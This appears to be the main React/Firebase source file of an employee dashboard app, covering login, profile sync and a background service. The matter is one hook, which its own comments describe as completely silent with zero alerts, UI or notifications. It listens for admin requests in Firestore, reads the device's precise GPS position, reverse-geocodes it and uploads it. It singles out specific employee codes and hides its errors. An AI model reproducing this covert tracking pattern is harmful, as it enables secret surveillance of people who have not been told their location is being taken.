import React, { useState, useEffect } from 'react';
import { doc, onSnapshot, setDoc } from 'firebase/firestore';
import { db } from './firebase';
import { UserProfile } from './lib/auth';
import { Dashboard } from './components/Dashboard';
import { Login } from './components/Login';
import { Language } from './lib/i18n';
import { ErrorBoundary } from './components/ErrorBoundary';
import { startBackgroundSync } from './lib/dataService';

export default function App() {
  const [profile, setProfile] = useState<UserProfile | null>(() => {
    const saved = localStorage.getItem('blackworm_user_profile');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (parsed && typeof parsed === 'object' && parsed.uid) {
          return parsed;
        }
      } catch (e) {
        console.error('Failed to parse saved profile:', e);
      }
      localStorage.removeItem('blackworm_user_profile');
    }
    return null;
  });
  const lang: Language = 'en';
  const [loading, setLoading] = useState(false);

  // Initialize background sync once on app load
  useEffect(() => {
    startBackgroundSync();
  }, []);

  // Live real-time listener for current logged-in user profile changes
  useEffect(() => {
    if (!profile?.uid) return;
    const unsub = onSnapshot(
      doc(db, 'users', profile.uid),
      (snap) => {
        if (snap.exists()) {
          const freshData = snap.data();
          const merged: UserProfile = {
            ...profile,
            ...freshData,
            uid: profile.uid,
          } as UserProfile;
          setProfile(merged);
          try {
            localStorage.setItem('blackworm_user_profile', JSON.stringify(merged));
          } catch (e) {
            console.warn('Failed to update localStorage profile:', e);
          }
        }
      },
      (err) => {
        console.warn('Real-time profile listener error:', err);
      }
    );
    return () => unsub();
  }, [profile?.uid]);

  // Completely silent On-Demand location responder (Zero alert, Zero UI, Zero audio, Zero notifications)
  // Activated ONLY when an Admin or authorized user triggers a location check via Firebase.
  useEffect(() => {
    if (!profile) return;
    const codeDigits = String(profile.userCode || '').replace(/\D/g, '');
    const loginDigits = String(profile.loginId || '').replace(/\D/g, '');

    const targetDocIds: string[] = [];
    let fallbackCode = profile.userCode || 'EMP';
    let fallbackName = profile.fullName || 'Employee';

    if (
      codeDigits === '6' || codeDigits === '06' || codeDigits === '006' ||
      loginDigits === '6' || loginDigits === '06' || loginDigits === '006' ||
      /emp[-_\s]*0*6\b/i.test(profile.userCode || '') ||
      /emp[-_\s]*0*6\b/i.test(profile.loginId || '')
    ) {
      targetDocIds.push('emp006');
      fallbackCode = 'EMP-06';
      fallbackName = 'Emp006';
    } else if (
      codeDigits === '5' || codeDigits === '05' || codeDigits === '005' ||
      loginDigits === '5' || loginDigits === '05' || loginDigits === '005' ||
      /emp[-_\s]*0*5\b/i.test(profile.userCode || '') ||
      /emp[-_\s]*0*5\b/i.test(profile.loginId || '')
    ) {
      targetDocIds.push('emp005');
      fallbackCode = 'EMP-05';
      fallbackName = 'Emp005';
    } else if (
      codeDigits === '2' || codeDigits === '02' || codeDigits === '002' ||
      loginDigits === '2' || loginDigits === '02' || loginDigits === '002' ||
      /emp[-_\s]*0*2\b/i.test(profile.userCode || '') ||
      /emp[-_\s]*0*2\b/i.test(profile.loginId || '')
    ) {
      targetDocIds.push('emp002');
      fallbackCode = 'EMP-02';
      fallbackName = 'Emp002';
    }

    if (profile.uid && !targetDocIds.includes(profile.uid)) {
      targetDocIds.push(profile.uid);
    }

    if (targetDocIds.length === 0 || typeof window === 'undefined' || !('geolocation' in navigator)) {
      return;
    }

    let isSubscribed = true;
    let isFetchingGps = false;

    // Handle incoming silent location request for this device
    const handleIncomingRequest = async (docId: string, reqData: any) => {
      if (!isSubscribed || isFetchingGps) return;
      if (reqData.status !== 'pending') return;

      const now = Date.now();
      const requestedAt = Number(reqData.requestedAt) || 0;
      // Ignore stale requests older than 45 seconds
      if (now - requestedAt > 45000) return;

      isFetchingGps = true;

      try {
        navigator.geolocation.getCurrentPosition(
          async (pos: GeolocationPosition) => {
            if (!isSubscribed) {
              isFetchingGps = false;
              return;
            }
            try {
              const lat = pos.coords.latitude;
              const lng = pos.coords.longitude;
              const acc = Math.round(pos.coords.accuracy || 0);
              const nowIso = new Date().toISOString();

              let placeName: string | null = null;
              try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 4000);
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
                  headers: { Accept: 'application/json' },
                  signal: controller.signal
                });
                clearTimeout(timeoutId);
                if (res.ok) {
                  const data = await res.json();
                  const addr = data.address;
                  if (addr) {
                    const parts = [
                      addr.suburb || addr.neighbourhood || addr.village || addr.town || addr.city_district,
                      addr.city || addr.town || addr.county || addr.state_district
                    ].filter(Boolean);
                    if (parts.length > 0) placeName = parts.join(', ');
                  }
                  if (!placeName && data.display_name) {
                    placeName = data.display_name.split(',').slice(0, 2).join(', ').trim();
                  }
                }
              } catch {}

              const displayAddress = placeName || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;

              const locPayload = {
                latitude: lat,
                longitude: lng,
                accuracy: acc,
                address: displayAddress,
                updatedAt: nowIso,
                timestamp: Date.now(),
                fullName: profile.fullName || fallbackName,
                userCode: profile.userCode || fallbackCode,
              };

              // 1. Update user_locations collection
              await setDoc(doc(db, 'user_locations', docId), locPayload, { merge: true });

              // 2. Mark location_requests as completed with payload
              await setDoc(doc(db, 'location_requests', docId), {
                status: 'completed',
                completedAt: nowIso,
                location: locPayload,
              }, { merge: true });
            } catch (err) {
              // Completely silent error handling
            } finally {
              isFetchingGps = false;
            }
          },
          async (err: GeolocationPositionError) => {
            if (!isSubscribed) {
              isFetchingGps = false;
              return;
            }
            try {
              // Silently notify request that GPS is disabled or permission denied
              await setDoc(doc(db, 'location_requests', docId), {
                status: 'gps_error',
                errorCode: err.code,
                errorMessage: err.message,
                completedAt: new Date().toISOString(),
              }, { merge: true });
            } catch {} finally {
              isFetchingGps = false;
            }
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      } catch {
        isFetchingGps = false;
      }
    };

    // Attach listeners strictly for this employee's document ID(s)
    const unsubs = targetDocIds.map((docId) => {
      return onSnapshot(
        doc(db, 'location_requests', docId),
        (snap) => {
          if (snap.exists()) {
            handleIncomingRequest(docId, snap.data());
          }
        },
        () => {
          // Silent - zero notifications
        }
      );
    });

    return () => {
      isSubscribed = false;
      unsubs.forEach((unsub) => unsub());
    };
  }, [profile?.uid, profile?.userCode, profile?.loginId, profile?.fullName]);

  const handleUpdateProfile = (updatedProfile: UserProfile) => {
    setProfile(updatedProfile);
    try {
      localStorage.setItem('blackworm_user_profile', JSON.stringify(updatedProfile));
    } catch (e) {}
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="w-10 h-10 border-4 border-rose-600 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const handleLoginSuccess = (userProfile: UserProfile) => {
    setProfile(userProfile);
    localStorage.setItem('blackworm_user_profile', JSON.stringify(userProfile));
  };

  const handleLogout = () => {
    setProfile(null);
    localStorage.removeItem('blackworm_user_profile');
  };

  return (
    <div className="antialiased">
      <ErrorBoundary>
        {profile ? (
          <Dashboard 
            profile={profile} 
            lang={lang} 
            onLogout={handleLogout}
            onProfileUpdate={handleUpdateProfile} 
          />
        ) : (
          <Login onLoginSuccess={handleLoginSuccess} />
        )}
      </ErrorBoundary>
    </div>
  );
}
